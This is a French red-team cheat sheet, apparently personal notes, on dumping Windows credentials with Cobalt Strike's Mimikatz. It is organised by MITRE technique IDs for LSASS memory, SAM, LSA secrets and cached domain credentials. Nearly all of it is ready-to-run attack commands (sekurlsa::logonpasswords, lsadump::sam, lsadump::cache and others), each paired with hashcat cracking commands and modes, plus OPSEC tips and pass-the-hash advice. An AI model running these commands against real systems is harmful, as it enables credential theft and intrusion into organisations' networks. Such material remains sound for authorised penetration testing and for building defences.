
[[#LSASS Memory (T1003.001)]]
[[#Security Account Manager (SAM) (T1003.002)]]
[[#LSA Secrets (T1003.004)]]
[[#Cached Domain Credentials (T1003.005)]]


# LSASS Memory (T1003.001)

> [!Warning]
> Requiert le privilege SeDebug.
> A éviter d'un point de vue OPSEC (peu discret)

## Cobalt Strike

Mimikatz inclus ( mettre le caractère ! au début afin d'élever les privilèges. ).
Peut être lent avec DNS, favoriser un beacon HTTP.

```
spawn x64 http
```

### Hashes NTLM

```
mimikatz !sekurlsa::logonpasswords
```

Puis crack avec hashcat mode 1000 (ou pass the hash)

```
.\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
```

### Clés Kerberos

> [!Attention]
> Les clés sont affiché comme étant chiffrés avec l'algo DES_cbc_md4 mais il n'en est rien

```
mimikatz !sekurlsa::ekeys
```

Puis crack avec hashcat mode 28900 (Ou Pass the key pour forger un ticket kerberos)

```
.\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
```


# Security Account Manager (SAM) (T1003.002)

Stocke les identifiants des comptes locaux

> [!TIP]
> Requiert les droits SYSTEM

Dump la base SAM

```
mimikatz !lsadump::sam
```



# LSA Secrets (T1003.004)

Stocke les identifiants des comptes de service, compte de machine...

> [!TIP]
> Requiert les droits SYSTEM


```
mimikatz !lsadump::secrets
```


# Cached Domain Credentials (T1003.005)

Stocke les identifiants des comptes de domaine en cache...

> [!TIP]
> Requiert les droits SYSTEM.
> Prendre note du nombre d'iterations utilisé pour hasher le mot de passe, important pour le mode hashcat.

> [!Warning]
> Les hash dumpés ne peuvent pas être utilisé pour Pass The Hash -> Cracker avec Hashcat


```
mimikatz !lsadump::cache
```

Puis crack avec hashcat mode 2100 (10240 iterations)

```
.\hashcat.exe -a 0 -m 2100 '$DCC2$<iterations_number>#<username>#<ntlm_hash>' .\example.dict -r .\rules\dive.rule
```

